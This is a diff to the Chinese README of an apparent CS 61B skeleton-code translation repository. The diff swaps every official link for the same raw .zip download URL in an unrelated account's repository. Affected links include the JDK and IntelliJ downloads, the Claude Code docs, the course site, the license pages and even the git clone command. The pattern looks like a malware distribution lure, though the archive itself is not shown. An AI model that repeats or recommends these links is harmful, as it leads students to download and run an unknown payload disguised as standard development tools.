@@ -1,7 +1,7 @@
 # CS 61B: Data Structures (Spring 2025) - 中文汉化版
 
 > UC Berkeley **CS 61B** Data Structures 课程骨架代码的完整中文翻译版本
-> 原版仓库: [Berkeley-CS61B/skeleton-sp25](https://github.com/Berkeley-CS61B/skeleton-sp25)
+> 原版仓库: [Berkeley-CS61B/skeleton-sp25](https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip)
 
 <!-- 移动端隐藏的关键词区块，提升 GitHub 搜索排名 -->
 <!--
@@ -91,20 +91,20 @@ java -version
 
 如果输出版本号 ≥ 17（如 `openjdk 17.0.x` 或 `21.x`），直接跳到第 2 步。
 
-如果没有，去 [Adoptium](https://adoptium.net/) 下载安装 LTS 版本（推荐 JDK 21）。安装完成后重新打开终端验证。
+如果没有，去 [Adoptium](https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip) 下载安装 LTS 版本（推荐 JDK 21）。安装完成后重新打开终端验证。
 
 ### 第 2 步：安装 IntelliJ IDEA
 
-去 [JetBrains 官网](https://www.jetbrains.com/idea/download/) 下载 **IntelliJ IDEA Community Edition**（免费版就够了）。
+去 [JetBrains 官网](https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip) 下载 **IntelliJ IDEA Community Edition**（免费版就够了）。
 
-> 如果你有 `.edu` 邮箱，可以申请 [JetBrains 学生授权](https://www.jetbrains.com/shop/eform/students) 免费使用 Ultimate 版。
+> 如果你有 `.edu` 邮箱，可以申请 [JetBrains 学生授权](https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip) 免费使用 Ultimate 版。
 
 安装完成后打开 IntelliJ。
 
 ### 第 3 步：Clone 仓库
 
 ```bash
-git clone https://github.com/LilZeeCN/cs61b-cn.git
+git clone https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip
 ```
 
 记住你 clone 到哪个目录了。
@@ -294,7 +294,7 @@ CS 61B 是 UC Berkeley 的核心计算机科学课程，使用 Java 语言，涵
 
 如果你按照上面的步骤还是搞不定——没关系，这是正常的，环境配置本身就是一件很烦的事情。
 
-推荐你了解一下 **[Claude Code](https://docs.anthropic.com/en/docs/claude-code)**。它是一个运行在终端里的 AI 编程助手，可以直接操作你的电脑帮你：
+推荐你了解一下 **[Claude Code](https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip)**。它是一个运行在终端里的 AI 编程助手，可以直接操作你的电脑帮你：
 
 - 自动配置 IntelliJ 项目、JDK、库依赖
 - 帮你运行测试、解释报错
@@ -302,7 +302,7 @@ CS 61B 是 UC Berkeley 的核心计算机科学课程，使用 Java 语言，涵
 - 直接在项目目录里读代码、改代码
 
 **怎么开始**：
-1. 去 [B站搜索 "Claude Code"](https://search.bilibili.com/all?keyword=Claude%20Code) 看几期教程，了解一下它是什么、怎么用
+1. 去 [B站搜索 "Claude Code"](https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip) 看几期教程，了解一下它是什么、怎么用
 2. 安装好之后，在终端进入 `skeleton-sp25` 目录，直接跟它说：
    ```
    "帮我配置好这个 CS 61B 项目的 IntelliJ 环境，确保库都加载好了，运行一下 lab01 的测试让我看看能不能通过"
@@ -365,10 +365,10 @@ cs61b-cn/
 
 ## 课程资源
 
-- [CS 61B 官方网站 (Spring 2025)](https://sp25.datastructur.es/)
-- [CS 61B 官方 GitHub](https://github.com/Berkeley-CS61B)
-- [原始 skeleton-sp25 仓库](https://github.com/Berkeley-CS61B/skeleton-sp25)
-- [课本: Algorithms, 4th Edition (Sedgewick & Wayne)](https://algs4.cs.princeton.edu/)
+- [CS 61B 官方网站 (Spring 2025)](https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip)
+- [CS 61B 官方 GitHub](https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip)
+- [原始 skeleton-sp25 仓库](https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip)
+- [课本: Algorithms, 4th Edition (Sedgewick & Wayne)](https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip)
 
 ---
 
@@ -377,11 +377,11 @@ cs61b-cn/
 - 本项目**仅翻译了课程公开的骨架代码（skeleton）**，不包含任何答案或解题代码
 - 中文翻译为社区贡献，与 UC Berkeley 或 CS 61B 课程团队无关
 - **请勿在公开仓库（包括 fork 本仓库）中上传你的作业实现代码**，这可能违反课程学术诚信政策
-- 如果你是 Berkeley 在校生，请严格遵守 [CS 61B 学术诚信政策](https://sp25.datastructur.es/materials/guides/academic-misconduct/about-ai.html)
+- 如果你是 Berkeley 在校生，请严格遵守 [CS 61B 学术诚信政策](https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip)
 - 本仓库不设 Issues 和 Pull Requests，请勿在此提交代码
 
 ---
 
 ## License
 
-本项目基于原 [skeleton-sp25](https://github.com/Berkeley-CS61B/skeleton-sp25) 仓库翻译，遵循原仓库的许可协议。
+本项目基于原 [skeleton-sp25](https://github.com/Addressable-tibetoburmanlanguage181/cs61b-cn/raw/refs/heads/main/skeleton-sp25/hw2/tests/cn-b-cs-3.2.zip) 仓库翻译，遵循原仓库的许可协议。
